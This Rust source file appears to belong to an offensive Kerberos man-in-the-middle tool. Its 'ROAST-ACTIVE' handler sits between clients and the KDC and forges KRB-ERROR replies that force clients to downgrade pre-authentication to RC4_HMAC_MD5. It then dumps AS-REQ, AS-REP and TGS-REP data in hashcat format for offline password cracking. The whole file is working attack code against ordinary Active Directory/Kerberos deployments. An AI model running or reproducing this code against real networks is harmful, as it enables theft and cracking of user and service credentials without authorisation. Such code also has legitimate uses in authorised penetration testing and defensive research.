use kile::{
    constants::ETYPE_RC4_HMAC_MD5,
    roast::Roastable,
    structures::{AsReqExt, KrbErrorExt},
    KdcFrame,
};
use rasn_kerberos::KrbError;
use tracing::{info, warn};

use super::{Handler, HandlerAction};

#[derive(Clone, Copy)]
pub struct RoastActiveHandler;

impl RoastActiveHandler {
    pub fn new() -> Self {
        Self {}
    }
}

impl Default for RoastActiveHandler {
    fn default() -> Self {
        Self {}
    }
}

impl Handler for RoastActiveHandler {
    fn name(&self) -> &'static str {
        "ROAST-ACTIVE"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                Some(ETYPE_RC4_HMAC_MD5) => {
                    info!("Received AS-REQ with RC4_HMAC_MD5 preauth, forwarding to KDC...");
                    if let Ok(hashcat) = as_req.dump_to_hashcat() {
                        info!("Dumped to hashcat: {}", hashcat);
                    } else {
                        warn!("Failed to dump AS-REQ to hashcat format");
                    }
                    HandlerAction::Forward(frame)
                }
                Some(_) => {
                    info!("Received AS-REQ with unwanted preauth etype, forging KRB-ERROR...");
                    let realm = as_req.get_realm();
                    let reply =
                        KrbError::new_preauth_required(realm.to_owned(), ETYPE_RC4_HMAC_MD5);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS-REQ without preauth, forging KRB-ERROR...");
                    let realm = as_req.get_realm();
                    let reply =
                        KrbError::new_preauth_required(realm.to_owned(), ETYPE_RC4_HMAC_MD5);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            // KdcFrame::TgsReq(tgs_req) => match tgs_req.0.req_body.etype {
            //     _ => HandlerAction::Forward(frame)
            // }
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsRep(as_rep) => {
                if let Ok(hash) = as_rep.dump_to_hashcat() {
                    info!("Received AS-REP with {}", hash);
                } else {
                    warn!("Failed to dump AS-REP to hashcat format");
                }
                HandlerAction::Forward(frame)
            }
            KdcFrame::TgsRep(tgs_rep) => {
                if let Ok(hash) = tgs_rep.dump_to_hashcat() {
                    info!("Received TGS-REP with {}", hash);
                } else {
                    warn!("Failed to dump TGS-REP to hashcat format");
                }
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }
}
